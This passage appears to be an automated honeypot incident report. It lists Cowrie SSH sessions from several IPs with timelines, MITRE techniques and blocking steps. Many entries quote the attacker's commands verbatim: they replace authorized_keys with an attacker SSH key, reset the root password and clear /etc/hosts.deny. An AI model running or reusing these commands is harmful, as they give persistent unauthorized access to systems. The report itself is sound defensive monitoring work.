| `2026-04-17 09:10:39` | `cowrie.session.connect` |
| `2026-04-17 09:10:40` | `cowrie.client.version` |
| `2026-04-17 09:10:40` | `cowrie.client.kex` |
| `2026-04-17 09:10:40` | `cowrie.login.success` |
| `2026-04-17 09:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a22cf69a75

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:10 |
| **Last Seen** | 2026-04-17 09:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:10:49` | `cowrie.session.connect` |
| `2026-04-17 09:10:49` | `cowrie.client.version` |
| `2026-04-17 09:10:49` | `cowrie.client.kex` |
| `2026-04-17 09:10:50` | `cowrie.login.success` |
| `2026-04-17 09:10:50` | `cowrie.session.params` |
| `2026-04-17 09:10:50` | `cowrie.command.input` |
| `2026-04-17 09:10:50` | `cowrie.command.failed` |
| `2026-04-17 09:10:50` | `cowrie.log.closed` |
| `2026-04-17 09:10:51` | `cowrie.session.params` |
| `2026-04-17 09:10:51` | `cowrie.command.input` |
| `2026-04-17 09:10:51` | `cowrie.session.file_download` |
| `2026-04-17 09:10:51` | `cowrie.log.closed` |
| `2026-04-17 09:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c87f277676

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:10 |
| **Last Seen** | 2026-04-17 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:10:53` | `cowrie.session.connect` |
| `2026-04-17 09:10:53` | `cowrie.client.version` |
| `2026-04-17 09:10:53` | `cowrie.client.kex` |
| `2026-04-17 09:10:54` | `cowrie.login.success` |
| `2026-04-17 09:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be21a7ccd12f

| Field | Detail |
|---|---|
| **Source IP** | `119.96.157[.]188` |
| **First Seen** | 2026-04-17 09:11 |
| **Last Seen** | 2026-04-17 09:12 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dGbqqjmF2V3I"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:11:43` | `cowrie.session.connect` |
| `2026-04-17 09:11:43` | `cowrie.client.version` |
| `2026-04-17 09:11:43` | `cowrie.client.kex` |
| `2026-04-17 09:11:46` | `cowrie.login.success` |
| `2026-04-17 09:11:47` | `cowrie.session.params` |
| `2026-04-17 09:11:47` | `cowrie.command.input` |
| `2026-04-17 09:11:47` | `cowrie.command.failed` |
| `2026-04-17 09:11:47` | `cowrie.log.closed` |
| `2026-04-17 09:11:48` | `cowrie.session.params` |
| `2026-04-17 09:11:48` | `cowrie.command.input` |
| `2026-04-17 09:11:49` | `cowrie.session.file_download` |
| `2026-04-17 09:11:49` | `cowrie.log.closed` |
| `2026-04-17 09:12:00` | `cowrie.session.params` |
| `2026-04-17 09:12:00` | `cowrie.command.input` |
| `2026-04-17 09:12:00` | `cowrie.log.closed` |
| `2026-04-17 09:12:01` | `cowrie.session.params` |
| `2026-04-17 09:12:01` | `cowrie.command.input` |
| `2026-04-17 09:12:01` | `cowrie.log.closed` |
| `2026-04-17 09:12:02` | `cowrie.session.params` |
| `2026-04-17 09:12:02` | `cowrie.command.input` |
| `2026-04-17 09:12:02` | `cowrie.session.file_download` |
| `2026-04-17 09:12:02` | `cowrie.log.closed` |
| `2026-04-17 09:12:03` | `cowrie.session.params` |
| `2026-04-17 09:12:03` | `cowrie.command.input` |
| `2026-04-17 09:12:03` | `cowrie.log.closed` |
| `2026-04-17 09:12:03` | `cowrie.session.params` |
| `2026-04-17 09:12:03` | `cowrie.command.input` |
| `2026-04-17 09:12:03` | `cowrie.log.closed` |
| `2026-04-17 09:12:04` | `cowrie.session.params` |
| `2026-04-17 09:12:04` | `cowrie.command.input` |
| `2026-04-17 09:12:04` | `cowrie.command.input` |
| `2026-04-17 09:12:04` | `cowrie.log.closed` |
| `2026-04-17 09:12:04` | `cowrie.session.params` |
| `2026-04-17 09:12:04` | `cowrie.command.input` |
| `2026-04-17 09:12:04` | `cowrie.log.closed` |
| `2026-04-17 09:12:04` | `cowrie.session.params` |
| `2026-04-17 09:12:04` | `cowrie.command.input` |
| `2026-04-17 09:12:05` | `cowrie.log.closed` |
| `2026-04-17 09:12:05` | `cowrie.session.params` |
| `2026-04-17 09:12:05` | `cowrie.command.input` |
| `2026-04-17 09:12:05` | `cowrie.log.closed` |
| `2026-04-17 09:12:05` | `cowrie.session.params` |
| `2026-04-17 09:12:05` | `cowrie.command.input` |
| `2026-04-17 09:12:06` | `cowrie.log.closed` |
| `2026-04-17 09:12:06` | `cowrie.session.params` |
| `2026-04-17 09:12:06` | `cowrie.command.input` |
| `2026-04-17 09:12:06` | `cowrie.log.closed` |
| `2026-04-17 09:12:07` | `cowrie.session.params` |
| `2026-04-17 09:12:07` | `cowrie.command.input` |
| `2026-04-17 09:12:07` | `cowrie.log.closed` |
| `2026-04-17 09:12:07` | `cowrie.session.params` |
| `2026-04-17 09:12:07` | `cowrie.command.input` |
| `2026-04-17 09:12:07` | `cowrie.log.closed` |
| `2026-04-17 09:12:08` | `cowrie.session.params` |
| `2026-04-17 09:12:08` | `cowrie.command.input` |
| `2026-04-17 09:12:08` | `cowrie.log.closed` |
| `2026-04-17 09:12:08` | `cowrie.session.params` |
| `2026-04-17 09:12:08` | `cowrie.command.input` |
| `2026-04-17 09:12:08` | `cowrie.log.closed` |
| `2026-04-17 09:12:08` | `cowrie.session.params` |
| `2026-04-17 09:12:08` | `cowrie.command.input` |
| `2026-04-17 09:12:09` | `cowrie.log.closed` |
| `2026-04-17 09:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.157[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.96.157[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d6d81d4a8d1

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:12 |
| **Last Seen** | 2026-04-17 09:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:12:04` | `cowrie.session.connect` |
| `2026-04-17 09:12:04` | `cowrie.client.version` |
| `2026-04-17 09:12:04` | `cowrie.client.kex` |
| `2026-04-17 09:12:05` | `cowrie.login.success` |
| `2026-04-17 09:12:05` | `cowrie.session.params` |
| `2026-04-17 09:12:05` | `cowrie.command.input` |
| `2026-04-17 09:12:05` | `cowrie.command.failed` |
| `2026-04-17 09:12:05` | `cowrie.log.closed` |
| `2026-04-17 09:12:06` | `cowrie.session.params` |
| `2026-04-17 09:12:06` | `cowrie.command.input` |
| `2026-04-17 09:12:06` | `cowrie.session.file_download` |
| `2026-04-17 09:12:06` | `cowrie.log.closed` |
| `2026-04-17 09:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878b377f84a4

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:12 |
| **Last Seen** | 2026-04-17 09:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:12:09` | `cowrie.session.connect` |
| `2026-04-17 09:12:09` | `cowrie.client.version` |
| `2026-04-17 09:12:09` | `cowrie.client.kex` |
| `2026-04-17 09:12:10` | `cowrie.login.success` |
| `2026-04-17 09:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525bb640a988

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:13 |
| **Last Seen** | 2026-04-17 09:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:13:16` | `cowrie.session.connect` |
| `2026-04-17 09:13:16` | `cowrie.client.version` |
| `2026-04-17 09:13:17` | `cowrie.client.kex` |
| `2026-04-17 09:13:17` | `cowrie.login.success` |
| `2026-04-17 09:13:17` | `cowrie.session.params` |
| `2026-04-17 09:13:17` | `cowrie.command.input` |
| `2026-04-17 09:13:17` | `cowrie.command.failed` |
| `2026-04-17 09:13:18` | `cowrie.log.closed` |
| `2026-04-17 09:13:18` | `cowrie.session.params` |
| `2026-04-17 09:13:18` | `cowrie.command.input` |
| `2026-04-17 09:13:18` | `cowrie.session.file_download` |
| `2026-04-17 09:13:18` | `cowrie.log.closed` |
| `2026-04-17 09:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae669dbe15f

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:13 |
| **Last Seen** | 2026-04-17 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:13:20` | `cowrie.session.connect` |
| `2026-04-17 09:13:20` | `cowrie.client.version` |
| `2026-04-17 09:13:20` | `cowrie.client.kex` |
| `2026-04-17 09:13:21` | `cowrie.login.success` |
| `2026-04-17 09:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b4fc5a1ccd

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:14 |
| **Last Seen** | 2026-04-17 09:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:14:50` | `cowrie.session.connect` |
| `2026-04-17 09:14:50` | `cowrie.client.version` |
| `2026-04-17 09:14:50` | `cowrie.client.kex` |
| `2026-04-17 09:14:51` | `cowrie.login.success` |
| `2026-04-17 09:14:51` | `cowrie.session.params` |
| `2026-04-17 09:14:51` | `cowrie.command.input` |
| `2026-04-17 09:14:51` | `cowrie.command.failed` |
| `2026-04-17 09:14:51` | `cowrie.log.closed` |
| `2026-04-17 09:14:52` | `cowrie.session.params` |
| `2026-04-17 09:14:52` | `cowrie.command.input` |
| `2026-04-17 09:14:52` | `cowrie.session.file_download` |
| `2026-04-17 09:14:52` | `cowrie.log.closed` |
| `2026-04-17 09:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f28b4b3de1

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:14 |
| **Last Seen** | 2026-04-17 09:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:14:54` | `cowrie.session.connect` |
| `2026-04-17 09:14:54` | `cowrie.client.version` |
| `2026-04-17 09:14:54` | `cowrie.client.kex` |
| `2026-04-17 09:14:54` | `cowrie.login.success` |
| `2026-04-17 09:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7baa252e47b

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:15 |
| **Last Seen** | 2026-04-17 09:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:15:39` | `cowrie.session.connect` |
| `2026-04-17 09:15:39` | `cowrie.client.version` |
| `2026-04-17 09:15:39` | `cowrie.client.kex` |
| `2026-04-17 09:15:40` | `cowrie.login.success` |
| `2026-04-17 09:15:40` | `cowrie.session.params` |
| `2026-04-17 09:15:40` | `cowrie.command.input` |
| `2026-04-17 09:15:40` | `cowrie.command.failed` |
| `2026-04-17 09:15:40` | `cowrie.log.closed` |
| `2026-04-17 09:15:41` | `cowrie.session.params` |
| `2026-04-17 09:15:41` | `cowrie.command.input` |
| `2026-04-17 09:15:41` | `cowrie.session.file_download` |
| `2026-04-17 09:15:41` | `cowrie.log.closed` |
| `2026-04-17 09:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea9aa73ff5c

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:15 |
| **Last Seen** | 2026-04-17 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:15:44` | `cowrie.session.connect` |
| `2026-04-17 09:15:44` | `cowrie.client.version` |
| `2026-04-17 09:15:44` | `cowrie.client.kex` |
| `2026-04-17 09:15:45` | `cowrie.login.success` |
| `2026-04-17 09:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a289fdfe77

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:16 |
| **Last Seen** | 2026-04-17 09:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:16:00` | `cowrie.session.connect` |
| `2026-04-17 09:16:00` | `cowrie.client.version` |
| `2026-04-17 09:16:00` | `cowrie.client.kex` |
| `2026-04-17 09:16:01` | `cowrie.login.success` |
| `2026-04-17 09:16:01` | `cowrie.session.params` |
| `2026-04-17 09:16:01` | `cowrie.command.input` |
| `2026-04-17 09:16:01` | `cowrie.command.failed` |
| `2026-04-17 09:16:01` | `cowrie.log.closed` |
| `2026-04-17 09:16:02` | `cowrie.session.params` |
| `2026-04-17 09:16:02` | `cowrie.command.input` |
| `2026-04-17 09:16:02` | `cowrie.session.file_download` |
| `2026-04-17 09:16:02` | `cowrie.log.closed` |
| `2026-04-17 09:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1dd68c06ccd

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:16 |
| **Last Seen** | 2026-04-17 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:16:04` | `cowrie.session.connect` |
| `2026-04-17 09:16:04` | `cowrie.client.version` |
| `2026-04-17 09:16:04` | `cowrie.client.kex` |
| `2026-04-17 09:16:05` | `cowrie.login.success` |
| `2026-04-17 09:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4886ea8c0841

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:16 |
| **Last Seen** | 2026-04-17 09:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:16:24` | `cowrie.session.connect` |
| `2026-04-17 09:16:24` | `cowrie.client.version` |
| `2026-04-17 09:16:24` | `cowrie.client.kex` |
| `2026-04-17 09:16:25` | `cowrie.login.success` |
| `2026-04-17 09:16:25` | `cowrie.session.params` |
| `2026-04-17 09:16:25` | `cowrie.command.input` |
| `2026-04-17 09:16:25` | `cowrie.command.failed` |
| `2026-04-17 09:16:25` | `cowrie.log.closed` |
| `2026-04-17 09:16:25` | `cowrie.session.params` |
| `2026-04-17 09:16:25` | `cowrie.command.input` |
| `2026-04-17 09:16:26` | `cowrie.session.file_download` |
